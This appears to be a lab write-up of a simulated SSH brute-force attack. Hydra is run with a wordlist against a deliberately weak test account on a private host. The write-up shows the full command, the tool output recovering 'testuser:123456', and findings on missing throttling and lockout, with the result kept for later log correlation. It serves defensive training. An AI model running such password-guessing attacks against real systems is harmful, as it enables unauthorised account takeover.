# Attack — SSH Brute Force (Hydra)

## Objective

Simulate a dictionary-based brute-force attack (MITRE ATT&CK **T1110 — Brute Force**)
against the SSH service identified during recon, targeting a test account with an
intentionally weak, common password.

## Target Account

A dedicated low-privilege test account was created on the target for this simulation
(never the real user account):

```bash
sudo useradd -m testuser
sudo passwd testuser   # set to: 123456
```

## Wordlist

A small curated list of common/breached passwords ([`wordlist.txt`](wordlist.txt)),
including the correct password mixed among decoys — so the attack generates a
realistic sequence of failed attempts before success, instead of guessing correctly
on the first try.

## Command

```bash
hydra -l testuser -P wordlist.txt -f 192.168.64.8 ssh
```

- `-l testuser`: single known username
- `-P wordlist.txt`: password list to try against that username
- `-f`: stop after the first valid credential pair is found
- `192.168.64.8 ssh`: target and service

## Result

```
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-02 14:54:53
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries (l:1/p:12), ~1 try per task
[DATA] attacking ssh://192.168.64.8:22/
[22][ssh] host: 192.168.64.8   login: testuser   password: 123456
[STATUS] attack finished for 192.168.64.8 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-02 14:54:53
```

## Findings

- Valid credentials recovered: `testuser:123456`
- Attack completed in under 1 second — no SSH-level throttling (`MaxAuthTries`),
  no `fail2ban`, no account lockout in place on the target
- Timestamp (attacker-side, local `-0600`): 2026-07-02 14:54:53 — used later to
  correlate against the target's `auth.log` in the investigation phase
